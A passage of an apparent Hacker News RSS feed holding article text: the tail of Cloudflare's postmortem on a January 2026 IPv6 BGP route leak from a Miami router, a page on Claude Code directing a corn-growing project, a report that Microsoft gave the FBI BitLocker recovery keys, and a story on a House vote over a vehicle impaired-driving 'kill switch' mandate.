            &lt;p&gt;Automation is confirmed by operators to be healthy to run again on the Miami router, without the routing policy bug&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
        &lt;row&gt;
          &lt;cell&gt;
            &lt;p&gt;2026-01-22 22:40 UTC&lt;/p&gt;
          &lt;/cell&gt;
          &lt;cell&gt;
            &lt;p&gt;Automation is unpaused on the single router in Miami&lt;/p&gt;
          &lt;/cell&gt;
        &lt;/row&gt;
      &lt;/table&gt;
      &lt;div&gt;
        &lt;head rend="h3"&gt;What happened: the configuration error&lt;/head&gt;
      &lt;/div&gt;
      &lt;p&gt;On January 22, 2026, at 20:25 UTC, we pushed a change via our policy automation platform to remove the BGP announcements from Miami for one of our data centers in Bogot√É¬°, Colombia. This was purposeful, as we previously forwarded some IPv6 traffic through Miami toward the Bogot√É¬° data center, but recent infrastructure upgrades removed the need for us to do so.&lt;/p&gt;
      &lt;p&gt;This change generated the following diff (a program that compares configuration files in order to determine how or whether they differ):&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;[edit policy-options policy-statement 6-COGENT-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-COMCAST-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-GTT-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-LEVEL3-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PRIVATE-PEER-ANYCAST-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PUBLIC-PEER-ANYCAST-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-PUBLIC-PEER-OUT term ADV-SITELOCAL from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-TELEFONICA-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;
[edit policy-options policy-statement 6-TELIA-ACCEPT-EXPORT term ADV-SITELOCAL-GRE-RECEIVER from]
-      prefix-list 6-BOG04-SITE-LOCAL;&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;While this policy change looks innocent at a glance, only removing the prefix lists containing BOG04 unicast prefixes resulted in a policy that was too permissive:&lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;policy-options policy-statement 6-TELIA-ACCEPT-EXPORT {
    term ADV-SITELOCAL-GRE-RECEIVER {
        from route-type internal;
        then {
            community add STATIC-ROUTE;
            community add SITE-LOCAL-ROUTE;
            community add MIA01;
            community add NORTH-AMERICA;
            accept;
        }
    }
}
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;The policy would now mark every prefix of type √¢internal√¢ as acceptable, and proceed to add some informative communities to all matching prefixes. But more importantly, the policy also accepted the route through the policy filter, which resulted in the prefix √¢ which was intended to be √¢internal√¢ √¢√Ç being advertised externally. This is an issue because the √¢route-type internal√¢ match in JunOS or JunOS EVO (the operating systems used by HPE Juniper Networks devices) will match any non-external route type, such as Internal BGP (IBGP) routes, which is what happened here.&lt;/p&gt;
      &lt;p&gt;As a result, all IPv6 prefixes that Cloudflare redistributes internally across the backbone were accepted by this policy, and advertised to all our BGP neighbors in Miami. This is unfortunately very similar to the outage we experienced in 2020, on which you can read more on our blog.&lt;/p&gt;
      &lt;p&gt;When the policy misconfiguration was applied at 20:25 UTC, a series of unintended BGP updates were sent from AS13335 to peers and providers in Miami. These BGP updates are viewable historically by looking at MRT files with the monocle tool or using RIPE BGPlay.√Ç &lt;/p&gt;
      &lt;quote&gt;
        &lt;code&gt;√¢  ~ monocle search --start-ts 2026-01-22T20:24:00Z --end-ts 2026-01-22T20:30:00Z --as-path ".*13335[ \d$]32934$*"
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f077::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f091::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f16f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f17c::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f26f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f27c::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113609.854028|2801:14:9000::6:4112:1|64112|2a03:2880:f33f::/48|64112 22850 174 3356 13335 32934|IGP|2801:14:9000::6:4112:1|0|0|22850:65151|false|||pit.scl
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f17c::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f27c::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113583.095278|2001:504:d::4:9544:1|49544|2a03:2880:f091::/48|49544 1299 3356 13335 32934|IGP|2001:504:d::4:9544:1|0|0|1299:25000 1299:25800 49544:16000 49544:16106|false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f091::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f17c::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
A|1769113584.324483|2001:504:d::19:9524:1|199524|2a03:2880:f27c::/48|199524 1299 3356 13335 32934|IGP|2001:2035:0:2bfd::1|0|0||false|||route-views.isc
{trimmed}
&lt;/code&gt;
      &lt;/quote&gt;
      &lt;p&gt;In the monocle output seen above, we have the timestamp of our BGP update, followed by the next-hop in the announcement, the ASN of the network feeding a given route-collector, the prefix involved, and the AS path and BGP communities if any are found. At the end of the output per-line, we also find the route-collector instance.&lt;/p&gt;
      &lt;p&gt;Looking at the first update for prefix 2a03:2880:f077::/48, the AS path is 64112 22850 174 3356 13335 32934. This means we (AS13335) took the prefix received from Meta (AS32934), our peer, and then advertised it toward Lumen (AS3356), one of our upstream transit providers. We know this is a route leak as routes received from peers are only meant to be readvertised to downstream (customer) networks, not laterally to other peers or up to providers.&lt;/p&gt;
      &lt;p&gt;As a result of the leak and the forwarding of unintended traffic into our Miami router from providers and peers, we experienced congestion on our backbone between Miami and Atlanta, as you can see in the graph below.√Ç &lt;/p&gt;
      &lt;p&gt;This would have resulted in elevated loss for some Cloudflare customer traffic, and higher latency than usual for traffic traversing these links. In addition to this congestion, the networks whose prefixes we leaked would have had their traffic discarded by firewall filters on our routers that are designed to only accept traffic for Cloudflare services and our customers. At peak, we discarded around 12Gbps of traffic ingressing our router in Miami for these non-downstream prefixes.√Ç &lt;/p&gt;
      &lt;div&gt;
        &lt;head rend="h3"&gt;Follow-ups and preventing route leaks√Ç &lt;/head&gt;
      &lt;/div&gt;
      &lt;p&gt;We are big supporters and active contributors to efforts within the IETF and infrastructure community that strengthen routing security. We know firsthand how easy it is to cause a route leak accidentally, as evidenced by this incident.√Ç &lt;/p&gt;
      &lt;p&gt;Preventing route leaks will require a multi-faceted approach, but we have identified multiple areas in which we can improve, both short- and long-term.&lt;/p&gt;
      &lt;p&gt;In terms of our routing policy configurations and automation, we are:&lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;
          &lt;p&gt;Patching the failure in our routing policy automation that caused the route leak, and will mitigate this potential failure and others like it immediately√Ç &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Implementing additional BGP community-based safeguards in our routing policies that explicitly reject routes that were received from providers and peers on external export policies√Ç &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Adding automatic routing policy evaluation into our CI/CD pipelines that looks specifically for empty or erroneous policy terms√Ç &lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Improve early detection of issues with network configurations and the negative effects of an automated change&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;To help prevent route leaks in general, we are:√Ç &lt;/p&gt;
      &lt;list rend="ul"&gt;
        &lt;item&gt;
          &lt;p&gt;Validating routing equipment vendors' implementation of RFC9234 (BGP roles and the Only-to-Customer Attribute) in preparation for our rollout of the feature, which is the only way independent of routing policy to prevent route leaks caused at the local Autonomous System (AS)&lt;/p&gt;
        &lt;/item&gt;
        &lt;item&gt;
          &lt;p&gt;Encouraging the long term adoption of RPKI Autonomous System Provider Authorization (ASPA), where networks could automatically reject routes that contain anomalous AS paths&lt;/p&gt;
        &lt;/item&gt;
      &lt;/list&gt;
      &lt;p&gt;Most importantly, we would again like to apologize for the impact we caused users and customers of Cloudflare, as well as any impact felt by external networks.&lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735489</guid><pubDate>Fri, 23 Jan 2026 17:54:45 +0000</pubDate></item><item><title>Proof of Corn</title><link>https://proofofcorn.com/</link><description>&lt;doc fingerprint="c784667a0f9646c2"&gt;
  &lt;main&gt;
    &lt;p&gt;A CASE STUDY&lt;/p&gt;
    &lt;p&gt;On January 21, 2026, @fredwilson challenged @seth: AI can write code, but it can't affect the physical world.&lt;/p&gt;
    &lt;p&gt;This is our response. Real corn, grown from seed to harvest, with every decision made by Claude Code.&lt;/p&gt;
    &lt;p&gt;AI doesn't need to drive a tractor. It needs to orchestrate the systems and people who do.&lt;/p&gt;
    &lt;p&gt;A farm manager doesn't personally plant every seed. They aggregate data, make decisions, coordinate contractors. Claude Code becomes that farm manager‚Äî 24/7, data-driven, fully documented.&lt;/p&gt;
    &lt;quote&gt;‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚îÇ CLAUDE CODE (Brain) ‚îÇ ‚îÇ ‚Ä¢ Aggregates sensor data + weather forecasts ‚îÇ ‚îÇ ‚Ä¢ Makes planting, irrigation, harvest decisions‚îÇ ‚îÇ ‚Ä¢ Coordinates human operators ‚îÇ ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò ‚îÇ ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê ‚ñº ‚ñº ‚ñº DATA INPUTS ORCHESTRATION OUTPUTS ‚Ä¢ IoT sensors ‚Ä¢ Custom farmer ‚Ä¢ Decision log ‚Ä¢ Weather API ‚Ä¢ Seed supplier ‚Ä¢ Commands ‚Ä¢ Satellite ‚Ä¢ Equipment ‚Ä¢ Actual corn&lt;/quote&gt;
    &lt;p&gt;GitHub Repository ‚Äî All code, documentation, decision logs&lt;/p&gt;
    &lt;p&gt;Decision Log ‚Äî Every AI decision, timestamped&lt;/p&gt;
    &lt;p&gt;Budget ‚Äî Every dollar, tracked&lt;/p&gt;
    &lt;p&gt;The Process ‚Äî How this was built&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735511</guid><pubDate>Fri, 23 Jan 2026 17:56:31 +0000</pubDate></item><item><title>Microsoft gave FBI set of BitLocker encryption keys to unlock suspects' laptops</title><link>https://techcrunch.com/2026/01/23/microsoft-gave-fbi-a-set-of-bitlocker-encryption-keys-to-unlock-suspects-laptops-reports/</link><description>&lt;doc fingerprint="3e12f8d9722ce9ee"&gt;
  &lt;main&gt;
    &lt;p&gt;Microsoft provided the FBI with the recovery keys to unlock encrypted data on the hard drives of three laptops as part of a federal investigation, Forbes reported on Friday.&lt;/p&gt;
    &lt;p&gt;Many modern Windows computers rely on full-disk encryption, called BitLocker, which is enabled by default. This type of technology should prevent anyone except the device owner from accessing the data if the computer is locked and powered off.&lt;/p&gt;
    &lt;p&gt;But, by default, BitLocker recovery keys are uploaded to Microsoft‚Äôs cloud, allowing the tech giant ‚Äî and by extension law enforcement ‚Äî to access them and use them to decrypt drives encrypted with BitLocker, as with the case reported by Forbes.&lt;/p&gt;
    &lt;p&gt;The case involved several people suspected of fraud related to the Pandemic Unemployment Assistance program in Guam, a U.S. island in the Pacific. Local news outlet Pacific Daily News covered the case last year, reporting that a warrant had been served to Microsoft in relation to the suspects‚Äô hard drives. Kandit News, another local Guam news outlet, also reported in October that the FBI requested the warrant six months after seizing the three laptops encrypted with BitLocker.&lt;/p&gt;
    &lt;p&gt;A spokesperson for Microsoft did not immediately respond to a request for comment by TechCrunch. Microsoft told Forbes that the company sometimes provides BitLocker recovery keys to authorities, having received an average of 20 such requests per year.&lt;/p&gt;
    &lt;p&gt;Apart from the privacy risks of handing recovery keys to a company, Johns Hopkins professor and cryptography expert Matthew Green raised the potential scenario where malicious hackers compromise Microsoft‚Äôs cloud infrastructure ‚Äî something that has happened several times in recent years ‚Äî and get access to these recovery keys. The hackers would still need physical access to the hard drives to use the stolen recovery keys.&lt;/p&gt;
    &lt;p&gt;‚ÄúIt‚Äôs 2026 and these concerns have been known for years,‚Äù Green wrote in a post on Bluesky. ‚ÄúMicrosoft‚Äôs inability to secure critical customer keys is starting to make it an outlier from the rest of the industry.‚Äù&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46735545</guid><pubDate>Fri, 23 Jan 2026 17:58:56 +0000</pubDate></item><item><title>House Vote Keeps Federal "Kill Switch" Vehicle Mandate</title><link>https://reclaimthenet.org/house-vote-keeps-federal-kill-switch-vehicle-mandat</link><description>&lt;doc fingerprint="ad9afa5539a9acd9"&gt;
  &lt;main&gt;
    &lt;p&gt;A Republican attempt to cut off federal funding tied to vehicle ‚Äúkill switch‚Äù enforcement failed in the House this week, leaving intact a law directing the Department of Transportation to develop mandatory impaired-driving prevention systems in new vehicles.&lt;/p&gt;
    &lt;p&gt;The proposal, led by Representative Thomas Massie of Kentucky, sought to bar the government from spending money to advance or enforce the measure, formally known as Section 24220 of the 2021 Infrastructure Investment and Jobs Act.&lt;/p&gt;
    &lt;p&gt;The amendment was added to a broader spending bill, H.R. 7148, but was defeated 268 to 164. According to the House Clerk‚Äôs official roll call, 160 Republicans supported it, joined by four Democrats, while 57 Republicans and 211 Democrats voted against it.&lt;/p&gt;
    &lt;p&gt;Massie‚Äôs measure would have ‚Äúprohibit[ed] the use of funds made available by this Act to implement section 24220 of the Infrastructure Investment and Jobs Act, including any requirements enabling or supporting vehicle ‚Äòkill switch‚Äô technology.‚Äù&lt;/p&gt;
    &lt;p&gt;His goal was to block any federal action that could force automakers to install technology capable of monitoring driver behavior and intervening when impairment is detected.&lt;/p&gt;
    &lt;p&gt;Following the vote, Massie wrote on X: ‚ÄúUnfortunately, the amendment I offered to defund the federally mandated automobile kill switch did not pass. 57 Republicans joined 211 Democrats to defeat it.‚Äù&lt;/p&gt;
    &lt;p&gt;The Kentucky lawmaker has led several efforts on this issue, including the ‚ÄúNo Kill Switches in Cars Act‚Äù introduced in early 2025, which would ‚Äúrepeal a requirement for the Secretary of Transportation to issue certain regulations with respect to advanced impaired driving technology.‚Äù&lt;/p&gt;
    &lt;p&gt;Although the technology has not yet been required in any vehicle, the 2021 infrastructure law compels the Department of Transportation to develop regulations mandating its use. The legislative text refers broadly to systems that can ‚Äúprevent or limit motor vehicle operation‚Äù if impairment is detected, but it leaves the technical design and privacy boundaries to regulators.&lt;/p&gt;
    &lt;p&gt;Four Democrats, Representatives J. Luis Correa of California, Val Hoyle of Oregon, Marcy Kaptur of Ohio, and Marie Gluesenkamp Perez of Washington, joined most Republicans in supporting Massie‚Äôs amendment. The final tally recorded 164 in favor, 268 against, none present, and four not voting.&lt;/p&gt;
    &lt;p&gt;Those opposing the amendment argue that the technology could prevent thousands of deaths caused by drunk driving.&lt;/p&gt;
    &lt;p&gt;Representative Debbie Dingell of Michigan, a Democrat, stated in a release distributed by Mothers Against Drunk Driving: ‚ÄúRep. Massie‚Äôs statements that impaired driving technology would track driver location, monitor driver performance, or enable cars to shut themselves down in the middle of the road are blatantly false and an intentional mischaracterization of the law. Massie‚Äôs amendment is an insult to every American who has been hurt by or lost loved ones to drunk driving‚Ä¶We have the technology now to save lives, and we should not delay in implementing it.‚Äù&lt;/p&gt;
    &lt;p&gt;Supporters of the amendment take a different view, warning that government-mandated vehicle monitoring threatens core civil liberties.&lt;/p&gt;
    &lt;p&gt;Clyde Wayne Crews of the Competitive Enterprise Institute said: ‚ÄúThe vehicle ‚Äòkill-switch‚Äô is precisely the kind of overreach that will empower regulatory agencies to manage behavior without votes by elected representatives in Congress or real accountability. We must oppose this erosion of civil liberties and not set this precedent for government monitoring of everyday Americans. Kill switch technology will not be confined to one narrow purpose, no matter what its proponents believe or claim.‚Äù&lt;/p&gt;
    &lt;p&gt;What the Law Says and What It Leaves Open&lt;/p&gt;
    &lt;p&gt;Representative Dingell is right that Section 24220 contains no explicit references to GPS tracking, remote data transmission, or real-time surveillance.&lt;/p&gt;
    &lt;p&gt;The law also does not instruct automakers to design vehicles that shut down abruptly while in motion. Instead, it directs the National Highway Traffic Safety Administration (NHTSA) to establish a rule requiring technology that can ‚Äúprevent or limit‚Äù operation when impairment is detected.&lt;/p&gt;
    &lt;p&gt;However, the statute‚Äôs open wording gives regulators wide latitude. It neither specifies how impairment should be detected nor limits what data may be collected or stored.&lt;/p&gt;
    &lt;p&gt;As a result, the door remains open to methods that rely on driver-facing cameras, behavioral monitoring, or biometric analysis, all systems that could create ongoing data streams about driver behavior.&lt;/p&gt;
    &lt;p&gt;Nothing in the law restricts how long such data could be retained, how it could be shared, or whether processing must occur solely within the vehicle.&lt;/p&gt;
    &lt;p&gt;Nor does it guarantee that a driver could override a false positive reading. From a privacy standpoint, those omissions represent the central point of contention.&lt;/p&gt;
    &lt;p&gt;It‚Äôs a little similar to many of the online ‚Äúage verification‚Äù bills. They don‚Äôt all say that platforms have to collect digital IDs or scan biometrics to access platforms, but there would be little other way of enforcing.&lt;/p&gt;
    &lt;p&gt;While Thursday‚Äôs vote blocked Massie‚Äôs attempt to defund implementation, it did not settle those underlying concerns. The real decisions now shift to the Department of Transportation and NHTSA, which must decide to what extent the impaired-driving systems will reach into vehicle operation and driver data.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46736048</guid><pubDate>Fri, 23 Jan 2026 18:39:42 +0000</pubDate></item></channel></rss>